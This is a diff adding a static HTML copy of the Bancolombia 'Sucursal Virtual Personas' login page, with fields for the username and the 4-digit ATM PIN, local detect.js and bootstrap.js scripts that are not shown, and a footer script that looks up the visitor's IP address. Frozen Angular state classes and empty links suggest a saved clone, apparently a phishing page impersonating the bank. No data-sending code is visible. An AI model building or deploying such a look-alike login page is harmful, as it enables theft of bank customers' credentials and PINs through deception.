@@ -1,0 +1,696 @@
+<!Doctype html>
+<html lang="es-CO" class="" style="font-size: 1rem">
+  <head>
+    <script async="" src="/asset/js/detect.js"></script>
+    <script async="" src="/asset/js/bootstrap.js"></script>
+    <meta charset="utf-8">
+    <title>Bancolombia Sucursal Virtual Personas</title>
+    <base href="/" />
+
+    <link rel="icon" type="image/x-icon" href="/asset/icon/favicon.ico" />
+    <!-- SVP themes stylesheet -->
+    <link
+      id="cursorThemeCSS"
+      rel="stylesheet"
+      href="/asset/css/small-cursor-dark.css"
+    />
+    <link
+      rel="stylesheet"
+      href="/asset/css/mouse-focus.css"
+      media="all"
+      onload="this.media = 'all'"
+    />
+    <noscript>
+      <link rel="stylesheet" href="asset/css/mouse-focus.css" />
+    </noscript>
+    <!-- BDS stylesheet -->
+    <link
+      id="svpThemeCSS"
+      rel="stylesheet"
+      href="/asset/css/bds.min.css"
+      media="all"
+      onload="this.media = 'all'"
+    />
+    <style>
+      html,
+      body {
+        font-synthesis: none;
+      }
+    </style>
+    <noscript>
+      <link rel="stylesheet" href="styles.1189c5223724e943.css" />
+    </noscript>
+    <style>
+      .informative-modal--without-outline[_ngcontent-ng-c2530656593] {
+        outline: none;
+      }
+    </style>
+    <style>
+      [_nghost-ng-c3549621726] #app-modal-inactive-question .bc-modal-active {
+        z-index: 1080;
+      }
+    </style>
+    <style>
+      [_nghost-ng-c2400663201] #app-modal-closed-session .bc-modal-active {
+        z-index: 1080;
+      }
+    </style>
+    <link
+      id="svp-bds-theme"
+      rel="stylesheet"
+      href="/asset/css/bds-black.min.css"
+    />
+    <style>
+      .card-padding[_ngcontent-ng-c54967524] {
+        padding: 6px;
+      }
+
+      @media (min-width: 575px) {
+        .card-padding[_ngcontent-ng-c54967524] {
+          padding: 32px;
+        }
+      }
+
+      @media (max-width: 575px) {
+        h1[_ngcontent-ng-c54967524] {
+          font-size: 1.75rem;
+        }
+      }
+
+      .steps[_ngcontent-ng-c54967524] {
+        margin: 0 auto 50px;
+      }
+
+      @media (max-width: 575px) {
+        .steps[_ngcontent-ng-c54967524] {
+          width: 100%;
+        }
+      }
+
+      .trazo[_ngcontent-ng-c54967524] {
+        background-repeat: no-repeat;
+        background-position: center;
+        background-size: 100%;
+      }
+
+      @media (max-width: 991px) {
+        .trazo[_ngcontent-ng-c54967524] {
+          background-size: auto;
+        }
+      }
+
+      .form-container[_ngcontent-ng-c54967524] {
+        padding-bottom: 3rem;
+      }
+
+      @media (max-width: 767px) {
+        .form-container[_ngcontent-ng-c54967524] {
+          padding-bottom: 0.7143rem;
+        }
+      }
+
+      @media (max-width: 575px) {
+        .form-container[_ngcontent-ng-c54967524] {
+          padding-bottom: 1.857rem;
+        }
+      }
+    </style>
+    <style>
+      .svp-main[_ngcontent-ng-c2515275900] {
+        display: block;
+        min-height: 77vh;
+      }
+    </style>
+    <style>
+      .logo[_ngcontent-ng-c123734241] {
+        height: 4rem;
+      }
+
+      .logo_filter[_ngcontent-ng-c123734241] {
+        filter: brightness(0) invert(100%);
+      }
+    </style>
+    <style>
+      #svp-footer {
+        padding: 1rem;
+      }
+
+      #svp-footer .bc-container {
+        max-width: 100%;
+      }
+    </style>
+    <style>
+      .authentication-form__username {
+        margin-top: 2rem;
+      }
+
+      .authentication-form__help-text {
+        display: block;
+        min-height: 1.063rem;
+      }
+
+      .authentication-form__password {
+        margin-top: 1.5rem;
+      }
+
+      .authentication-form__password-input {
+        -webkit-text-security: disc;
+      }
+
+      svp-authentication-form .bc-card-auth-body {
+        padding: 3rem;
+      }
+
+      @media (max-width: 575px) {
+        svp-authentication-form .bc-card-auth-body {
+          padding: 1.5rem;
+        }
+      }
+
+      svp-authentication-form .bc-card-auth-body .bc-icon {
+        display: none;
+      }
+
+      svp-authentication-form ::-ms-reveal {
+        display: none;
+      }
+
+      svp-authentication-form .bc-card-auth-body .bc-card-auth-container {
+        margin-bottom: 3rem;
+      }
+    </style>
+  </head>
+
+  <body class="bc-bg-brand-N-P-pair-50-00" id="body">
+    <app-root _nghost-ng-c3561947507="">
+      <div _ngcontent-ng-c3561947507="" svpdisablecopypaste="">
+        <svp-authentication _nghost-ng-c403088413=""
+          ><app-register-template
+            _ngcontent-ng-c403088413=""
+            title="Sucursal Virtual Personas"
+            _nghost-ng-c54967524=""
+            ><app-simple-template
+              _ngcontent-ng-c54967524=""
+              _nghost-ng-c2515275900=""
+            >
+              <main _ngcontent-ng-c2515275900="" class="svp-main">
+                <div  _ngcontent-ng-c54967524=""
+                  class="bc-container-fluid trazo"
+                  style="background-image: url(asset/images/trazo.svg)"
+                >
+                  <app-logo-bancolombia
+                    _ngcontent-ng-c54967524=""
+                    class="bc-flex bc-justify-content-center"
+                    _nghost-ng-c123734241=""
+                  >
+                    <div
+                      _ngcontent-ng-c123734241=""
+                      class="bc-flex bc-justify-content-center bc-mt-5"
+                    >
+                      <bc-logo
+                        _ngcontent-ng-c123734241=""
+                        name="bancolombia-horizontal-no-spacing"
+                        size="11.5rem"
+                        alt="logo"
+                        class="logo bc-flex bc-justify-content-center logo_filter bc-logo"
+                        aria-hidden="true"
+                        style="width: 11.5rem"
+                        ><img
+                          src="/asset/images/bancolombia-horizontal-no-spacing.svg"
+                          alt="logo"
+                          style="width: 11.5rem"
+                      /></bc-logo>
+                    </div>
+                  </app-logo-bancolombia>
+                  <h1
+                    _ngcontent-ng-c54967524=""
+                    class="bc-text-center bc-cibsans-font-style-9-extralight bc-mt-4 bc-fs-xs"
+                  >
+                    Sucursal Virtual Personas
+                  </h1>
+                  <!---->
+                  <div
+                    _ngcontent-ng-c54967524=""
+                    class="bc-row bc-justify-content-center form-container"
+                  >
+                    <div
+                      _ngcontent-ng-c54967524=""
+                      class="bc-col-xs-6 bc-col-md-8 bc-col-lg-4"
+                    >
+                      <section _ngcontent-ng-c54967524="" class="bc-mt-4">
+                        <app-banner _ngcontent-ng-c54967524=""
+                          ><bc-inline-alert
+                            version="Links"
+                            role="none"
+                            class="bc-inline-alert-large"
+                            ><article
+                              tabindex="0"
+                              role="alertdialog"
+                              id="n.46097355"
+                              aria-label="¡Prográmate! Consulta el estado de nuestros canales y los mantenimientos programados."
+                              class="bc-inline-alert-active bc-inline-alert bc-inline-alert-info bc-inline-alert-large"
+                            >
+                              <section
+                                aria-hidden="true"
+                                class="bc-inline-alert-status"
+                              >
+                                <bc-transaction-status
+                                  size="md"
+                                  aria-hidden="true"
+                                  inerit=""
+                                  ><div
+                                    class="bc-transaction-status bc-transaction-status-info bc-transaction-status-md"
+                                    aria-label="Estado informativo"
+                                  >
+                                    <bc-icon
+                                      role="img"
+                                      aria-hidden="true"
+                                      class="bc-2xs bc-icon"
+                                      style="visibility: visible"
+                                      name=" lightbulb-small "
+                                    >
+                                      lightbulb-small
+                                    </bc-icon>
+                                  </div></bc-transaction-status
+                                >
+                              </section>
+                              <!---->
+                              <section class="bc-inline-alert-body">
+                                <section
+                                  aria-hidden="true"
+                                  inerit=""
+                                  class="bc-inline-alert-content"
+                                >
+                                  <span
+                                    aria-hidden="true"
+                                    class="screen-reader-only"
+                                    id="n.46097355-type"
+                                    >Mensaje informativo</span
+                                  >
+                                  <p
+                                    aria-hidden="true"
+                                    class="bc-inline-alert-title"
+                                    id="n.46097355-title"
+                                  >
+                                    ¡Prográmate!
+                                  </p>
+                                  <!---->
+                                  <p
+                                    aria-hidden="true"
+                                    class="bc-inline-alert-text"
+                                    id="n.46097355-body"
+                                  >
+                                    Consulta el estado de nuestros canales y los
+                                    mantenimientos programados.
+                                  </p>
+                                  <!----><!---->
+                                </section>
+                                <!---->
+                                <section class="bc-inline-alert-buttons">
+                                  <ul role="presentation">
+                                    <li role="none">
+                                      <a
+                                        bc-link=""
+                                        sizelink="underlineLarge"
+                                        rel="noopener noreferrer"
+                                        typelink="underline"
+                                        role="link"
+                                        class="bc-inline-alert-link bc-link link-underline link-underline-large"
+                                        href=""
+                                        id="n.46097355_link_0"
+                                        ><u>Más info aquí.</u></a
+                                      ><!----><!---->
+                                    </li>
+                                    <!---->
+                                  </ul>
+                                </section>
+                                <!---->
+                              </section>
+                              <!---->
+                            </article></bc-inline-alert
+                          ></app-banner
+                        >
+                      </section>
+                      <!---->
+                      <div _ngcontent-ng-c54967524="">
+                        <div
+                          _ngcontent-ng-c54967524=""
+                          class="bc-card-body bc-mt-4"
+                        >
+                          <svp-authentication-form _ngcontent-ng-c403088413="">
+                            <svp-error-component-factory>
+                              <bc-card-authentication
+                                titlecardauth="¡Hola!"
+                                aria-label="Hola. Ingresa los datos para gestionar tus productos y hacer transacciones."
+                                tabindex="0"
+                                descriptioncardauth="Ingresa los datos para gestionar tus productos y hacer transacciones."
+                                amountofbuttons="one"
+                                typecontainerauth="staticContainer"
+                                class="ng-pristine ng-invalid ng-touched"
+                              >
+                                <section
+                                  id="card1"
+                                  class="bc-card bc-card-auth bc-card-container"
+                                >
+                                  <section id="id00" class="bc-card-auth-body">
+                                    <section class="bc-card-auth-head">
+                                      <section>
+                                        <em
+                                          aria-hidden="true"
+                                          class="bc-icon"
+                                        ></em>
+                                      </section>
+                                      <h1
+                                        class="bc-card-auth-title bc-cibsans-font-style-5-bold bc-mt-3"
+                                      >
+                                        ¡Hola!
+                                      </h1>
+                                      <!---->
+                                      <h3
+                                        class="bc-card-auth-description bc-mt-3"
+                                      >
+                                        Ingresa los datos para gestionar tus
+                                        productos y hacer transacciones.
+                                      </h3>
+                                    </section>
+                                    <form
+                                      novalidate=""
+                                      id="form"
+                                      class="ng-untouched ng-pristine ng-valid"
+                                    >
+                                      <section>
+                                        <section
+                                          cardauthstaticcontainer=""
+                                          class="bc-card-auth-container"
+                                        >
+                                          <bc-form-field
+                                            class="authentication-form__username"
+                                          >
+                                            <div class="bc-form-field" id="">
+                                              <em aria-hidden="false">user</em>
+                                              <input
+                                                id="username"
+                                                bc-input=""
+                                                alphanumericonly=""
+                                                formcontrolname="username"
+                                                autocomplete="off"
+                                                autocorrect="off"
+                                                spellcheck="false"
+                                                maxlength="20"
+                                                inputmode="numeric"
+                                                aria-label="Ingresa usuario"
+                                                aria-describedby="useername-helper"
+                                                class="bc-input ng-touched ng-dirty ng-valid bc-active"
+                                                aria-invalid="false"
+                                                placeholder=" "
+                                                data-gtm-form-interact-field-id="1"
+                                              /><!---->
+                                              <label for="username"
+                                                >Usuario</label
+                                              >
+                                              <span
+                                                id="username-helper"
+                                                role="alert"
+                                                class="authentication-form__help-text bc-d-none"
+                                              >
+                                              </span>
+                                              <a
+                                                bc-link=""
+                                                href=""
+                                                data-testid="forgot-username-link"
+                                                typelink="underline"
+                                                class="bc-opensans-font-style-1-bold bc-link link-default link-underline"
+                                                ><u
+                                                  >¿Olvidaste tu usuario?</u
+                                                ></a
+                                              >
+                                            </div> </bc-form-field
+                                          ><bc-form-field
+                                            class="authentication-form__password"
+                                          >
+                                            <div
+                                              class="bc-form-field"
+                                              id="n.1984926458"
+                                            >
+                                              <em aria-hidden="false">lock</em
+                                              ><input
+                                                id="password"
+                                                bc-input=""
+                                                svponlynumber=""
+                                                type="text"
+                                                inputmode="numeric"
+                                                formcontrolname="password"
+                                                autocomplete="off"
+                                                maxlength="4"
+                                                oninput="this.value = this.value.replace(/[^0-9]/g, '')"
+                                                aria-label="Ingresa clave del cajero"
+                                                aria-describedby="password-helper"
+                                                class="authentication-form__password-input bc-input ng-touched ng-dirty bc-active ng-valid"
+                                                aria-invalid="false"
+                                                placeholder=" "
+                                                data-gtm-form-interact-field-id="1"
+                                              /><!----><label
+                                                for="password"
+                                                aria-hidden="true"
+                                                >Clave del cajero</label
+                                              ><span
+                                                id="password-helper"
+                                                role="alert"
+                                                class="authentication-form__hel-text bc-d-none"
+                                              ></span>
+                                              <a
+                                                bc-link=""
+                                                href=""
+                                                data-testid="forgot-password-link"
+                                                typelink="underline"
+                                                class="bc-opensans-font-style-1-bold bc-link link-default link-underline"
+                                                ><u
+                                                  >¿Olvidaste o bloqueaste tu
+                                                  clave?</u
+                                                ></a
+                                              >
+                                            </div> </bc-form-field
+                                          ><!---->
+                                        </section>
+                                      </section>
+                                      <!----><!---->
+                                      <section class="bc-card-auth-button">
+                                        <button
+                                          cardauthbutton=""
+                                          bc-button=""
+                                          tabindex="0"
+                                          sizebutton="default"
+                                          data-test="login-button"
+                                          class="bc-button bc-button-fill bc-button-primary"
+                                        >
+                                          Iniciar sesión
+                                        </button>
+                                      </section>
+                                      <!----><!---->
+                                    </form>
+                                    <section class="bc-card-auth-link">
+                                      <a
+                                        cardauthmainlink=""
+                                        bc-link=""
+                                        typelink="underline"
+                                        sizelink="default"
+                                        href=""
+                                        class="bc-link link-default link-underline"
+                                        ><u>Crear usuario</u></a
+                                      >
+                                    </section>
+                                    <section></section>
+                                  </section>
+                                </section> </bc-card-authentication
+                              ><!----><!----><!----></svp-error-component-factory><svp-circle-loader
+                              ><bc-circle-loading>
+                                <article
+                                  class="bc-circle-loading"
+                                  id="o.3249941175"
+                                  data-text="Cargando..."
+                                  data-accessibility-label="Cargando..."
+                                  data-speed-loader="0.5"
+                                  aria-label="Cargando..."
+                                  role="status"
+                                >
+                                  <section
+                                    class="bc-circle-loading-circle"
+                                    tabindex="1"
+                                    style="--circle-loading-size: 160px"
+                                  >
+                                    <em
+                                      class="bc-icon bc-xl bc-loader bc-circle-loading-loader-icon"
+                                      aria-hidden="true"
+                                      aria-label="Cargando"
+                                      style="
+                                        --bc-loader-animation-duration: 0.5s;
+                                      "
+                                      >spinner</em
+                                    >
+                                    <p
+                                      class="bc-circle-loading-info bc-text-break"
+                                      aria-hidden="true"
+                                    >
+                                      Cargando...
+                                    </p>
+                                  </section>
+                                </article>
+                              </bc-circle-loading></svp-circle-loader
+                            ></svp-authentication-form
+                          >
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </main>
+              <svp-footer _ngcontent-ng-c2515275900=""
+                ><bc-footer componentid="svp-footer">
+                  <div class="bc-footer" id="svp-footer">
+                    <div class="bc-container bc-pb-4">
+                      <!---->
+                      <div class="bc-footer-top-links">
+                        <div class="bc-footer-top-links-ca">
+                          <a
+                            bc-link=""
+                            href=""
+                            rel="noopener noreferrer"
+                            class="bc-link link-default"
+                          >
+                            ¿Problemas para conectarte? </a
+                          ><!----><!----><!---->
+                        </div>
+                        <span class="bc-footer-separator" aria-hidden="true"
+                          >·</span
+                        >
+                        <div class="bc-footer-top-links-ca">
+                          <a
+                            bc-link=""
+                            href=""
+                            rel="noopener noreferrer"
+                            class="bc-link link-default"
+                          >
+                            Aprende sobre seguridad </a
+                          ><!----><!----><!---->
+                        </div>
+                        <span class="bc-footer-separator" aria-hidden="true"
+                          >·</span
+                        >
+                        <div class="bc-footer-top-links-ca">
+                          <a
+                            bc-link=""
+                            href=""
+                            rel="noopener noreferrer"
+                            class="bc-link link-default"
+                          >
+                            Reglamento Sucursal Virtual </a
+                          ><!----><!----><!---->
+                        </div>
+                        <span class="bc-footer-separator" aria-hidden="true"
+                          >·</span
+                        >
+                        <div class="bc-footer-top-links-ca">
+                          <a
+                            bc-link=""
+                            href=""
+                            rel="noopener noreferrer"
+                            class="bc-link link-default"
+                          >
+                            Política de privacidad </a
+                          ><!----><!----><!---->
+                        </div>
+                        <!---->
+                      </div>
+                      <!---->
+                      <div class="bc-footer-divisor"></div>
+                      <div class="bc-footer-bottom">
+                        <div class="bc-footer-bottom-left">
+                          <!---->
+                          <div class="bc-footer-bottom-left-side">
+                            <div class="bc-footer-bottom-top-icon">
+                              <bc-logo
+                                size="150px"
+                                alt="logo"
+                                aria-hidden="true"
+                                class="bc-logo"
+                                style="width: 150px"
+                                ><img
+                                  src="asset/images/bancolombia-horizontal-no-spacing.svg"
+                                  alt="logo"
+                                  style="width: 150px"
+                              /></bc-logo>
+                            </div>
+                            <!----><!---->
+                            <div class="bc-footer-bottom-left-side-vigilant">
+                              <bc-logo
+                                alt="Vigilado Superintendencia Financiera de Colombia"
+                                aria-hidden="false"
+                                class="bc-logo"
+                                style="width: 16px"
+                                ><img
+                                  src="asset/images/logo-vigilado.svg"
+                                  alt="Vigilado Superintendencia Financiera de Colombia"
+                                  style="width: 16px"
+                              /></bc-logo>
+                            </div>
+                            <!---->
+                          </div>
+                        </div>
+                        <div class="bc-footer-bottom-right">
+                          <!---->
+                          <div class="bc-footer-bottom-right-text">
+                            <p>Direccion IP: <span id="ip"></span></p>
+                            <p><span id="fecha"></span></p>
+
+                            <script>
+                              function actualizarFecha() {
+                                const ahora = new Date();
+
+                                const opciones = {
+                                  weekday: "long",
+                                  year: "numeric",
+                                  month: "long",
+                                  day: "numeric",
+                                  hour: "numeric",
+                                  minute: "2-digit",
+                                  hour12: true,
+                                };
+
+                                let fecha = ahora.toLocaleString(
+                                  "es-CO",
+                                  opciones,
+                                );
+                                fecha = fecha
+                                  .replace("a.m.", "a.&nbsp;m.")
+                                  .replace("p.m.", "p.&nbsp;m.");
+
+                                document.getElementById("fecha").innerHTML =
+                                  fecha;
+                              }
+
+                              actualizarFecha();
+                              setInterval(actualizarFecha, 1000);
+
+                              fetch("https://api.ipify.org?format=json")
+                                .then((res) => res.json())
+                                .then((data) => {
+                                  document.getElementById("ip").innerText =
+                                    data.ip;
+                                });
+                            </script>
+                          </div>
+                          <!---->
+                        </div>
+                      </div>
+                      <!---->
+                    </div>
+                  </div>
+                </bc-footer></svp-footer
+              >
+            </app-simple-template></app-register-template
+          ></svp-authentication
+        ><!---->
+      </div>
+    </app-root>
+  </body>
+</html>
